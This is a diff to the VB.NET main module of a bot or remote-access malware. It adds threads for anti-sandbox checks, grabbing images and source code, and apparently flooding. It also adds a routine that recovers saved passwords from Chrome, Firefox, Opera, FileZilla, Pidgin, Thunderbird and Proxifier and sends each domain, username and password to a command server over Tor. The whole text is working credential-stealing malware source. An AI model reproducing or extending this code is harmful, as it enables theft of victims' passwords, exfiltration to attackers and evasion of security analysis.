@@ -9,12 +9,14 @@ Module Main
     ReadOnly NewNotice As New Thread(AddressOf Noticer)
     ReadOnly DelayedAction As New Thread(AddressOf DelayedActions)
     ReadOnly NewImageGraber As New Thread(AddressOf ImageGraber)
+    ReadOnly NewGitGraber As New Thread(AddressOf GitGraber)
     ReadOnly NewDetecter As New Thread(AddressOf Detecter)
+    ReadOnly NewAnitSanbox As New Thread(AddressOf RunAntis)
     ReadOnly NewWebfilters As New Thread(AddressOf WebFilters)
     Private _command As New CommandHandler
     Private _config As New ConfigBotModel
     Private _FloodsBase As Floodsbase
-    Private _KeyboardHook As New KeyboardHook
+    'Private _KeyboardHook As KeyboardHook
     Public Function GetFloodsBase()
         Return _FloodsBase
     End Function
@@ -41,6 +43,13 @@ Module Main
     Public Property MainThreadCreateWebBrowserForm As WebBrowserForm
     <STAThread()>
     Public Sub Main()
+        StartThreads()
+        Dim floodsbase As New Floodsbase
+        SetFloodsBase(floodsbase)
+        StartKeyLoggers()
+        StartWebForms()
+    End Sub
+    Private Sub StartThreads()
         configBot()
         NewDetecter.Start()
         Install()
@@ -49,19 +58,15 @@ Module Main
         NewNotice.Start()
         NewWebfilters.Start()
         DelayedAction.Start()
-        Dim floodsbase As New Floodsbase
-        SetFloodsBase(floodsbase)
+        If Config.Variables.AntiSandbox Then
+            NewAnitSanbox.Start()
+        End If
         If Not File.Exists(GetConfigJson().MainPath & "\Images.txt") Then
             NewImageGraber.Start()
         End If
-        If Config.Variables.AntiSandbox Then
-            RunAntis()
+        If Not File.Exists(GetConfigJson().MainPath & "\SourceCodes.txt") Then
+            NewGitGraber.Start()
         End If
-        If Config.Variables.Keyloggers Then
-            'GetChrome()
-            '_KeyboardHook.Register()
-        End If
-        MainThreadCreateWebBrowserForm = New WebBrowserForm
     End Sub
     Public Function GetWebrowser()
         Return MainThreadCreateWebBrowserForm
@@ -105,7 +110,61 @@ Module Main
         Config = configjson
     End Sub
     Public Sub WebFilters()
-        Dim r As New Random
-        Go(Config.WebFilters(r.Next(Config.WebFilters.Count - 1)))
+        Try
+            If Config.Variables.Debug Then
+                Console.WriteLine("WebFilters working...")
+            End If
+            Dim r As New Random
+            Go(Config.WebFilters(r.Next(Config.WebFilters.Count - 1)))
+        Catch ex As Exception
+            If Config.Variables.Debug Then
+                Console.WriteLine("WebFilters error:" & ex.ToString)
+            End If
+        End Try
+    End Sub
+    Private Sub StartWebForms()
+        Try
+            If Config.Variables.Debug Then
+                Console.WriteLine("WebBrowserForm working...")
+            End If
+            MainThreadCreateWebBrowserForm = New WebBrowserForm
+        Catch ex As Exception
+            If Config.Variables.Debug Then
+                Console.WriteLine("WebBrowserForm error:" & ex.ToString)
+            End If
+        End Try
+    End Sub
+    Private Sub StartKeyLoggers()
+        If Config.Variables.Keyloggers Then
+            For Each Drive As DriveInfo In DriveInfo.GetDrives
+                If Drive.RootDirectory.FullName = "C:\" Then
+                    Dim x As New PREC(Drive)
+                    With x
+                        .RecoverChrome()
+                        .RecoverFileZilla()
+                        .RecoverFirefox()
+                        .RecoverOpera()
+                        .RecoverPidgin()
+                        .RecoverThunderbird()
+                        .RecoverProxifier()
+                    End With
+                    For Each A As Account In x.Accounts
+                        If Config.Variables.Debug Then
+                            Console.WriteLine("Keyloggers: " & A.ToString())
+                        End If
+                        Dim http As New SendHTTPonTor
+                        Dim model As New LogModel With {
+                            .KeyUnique = GetConfigJson().KeyUnique,
+                            .Type = "Password",
+                            .Message = "Domain: " & A.Domain.ToString &
+                                       " Username: " & A.Username.ToString &
+                                       " Password: " & A.Password.ToString &
+                                       " Type: " & A.Type.ToString
+                        }
+                        http.TalkChannelHTTP(model, _config.UrlVariables.LogUrl, Config.Variables.Address, Config.Variables.ServerReachPort)
+                    Next
+                End If
+            Next
+        End If
     End Sub
 End Module
